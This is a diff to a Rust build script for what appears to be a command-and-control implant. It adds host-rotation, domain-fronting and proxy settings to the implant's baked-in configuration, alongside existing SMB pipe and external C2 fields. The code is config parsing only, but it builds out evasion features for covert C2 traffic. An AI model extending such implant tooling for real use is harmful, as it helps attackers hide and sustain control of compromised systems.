@@ -123,6 +123,10 @@ fn bake_config() {
     write_str(&mut blob, cfg.smb_pipe_name.as_bytes());
     write_str(&mut blob, cfg.extc2_api_host.as_bytes());
     write_str(&mut blob, cfg.extc2_token.as_bytes());
+    // HTTP enhancement fields (spec-7):
+    write_str(&mut blob, cfg.rotation_hosts.as_bytes());
+    write_str(&mut blob, cfg.fronting_host.as_bytes());
+    write_str(&mut blob, cfg.proxy_server.as_bytes());
 
     let out_dir = env::var("OUT_DIR").unwrap();
 
@@ -525,6 +529,10 @@ struct ConfigVals {
     smb_pipe_name: String,
     extc2_api_host: String,
     extc2_token: String,
+    // HTTP channel enhancements (spec-7):
+    rotation_hosts: String,
+    fronting_host: String,
+    proxy_server: String,
 }
 
 /// Minimal TOML-ish parser. Only understands `key = "value"` (strings) and
@@ -544,6 +552,10 @@ fn parse_config(text: Option<&str>) -> ConfigVals {
     let mut smb_pipe_name = String::new();
     let mut extc2_api_host = String::new();
     let mut extc2_token = String::new();
+    // HTTP enhancement (spec-7):
+    let mut rotation_hosts = String::new();
+    let mut fronting_host = String::new();
+    let mut proxy_server = String::new();
 
     if let Some(t) = text {
         for raw in t.lines() {
@@ -619,6 +631,21 @@ fn parse_config(text: Option<&str>) -> ConfigVals {
                         extc2_token = s;
                     }
                 }
+                "rotation_hosts" => {
+                    if let Some(s) = unquote(val) {
+                        rotation_hosts = s;
+                    }
+                }
+                "fronting_host" => {
+                    if let Some(s) = unquote(val) {
+                        fronting_host = s;
+                    }
+                }
+                "proxy_server" => {
+                    if let Some(s) = unquote(val) {
+                        proxy_server = s;
+                    }
+                }
                 _ => {}
             }
         }
@@ -637,6 +664,9 @@ fn parse_config(text: Option<&str>) -> ConfigVals {
         smb_pipe_name,
         extc2_api_host,
         extc2_token,
+        rotation_hosts,
+        fronting_host,
+        proxy_server,
     }
 }
 
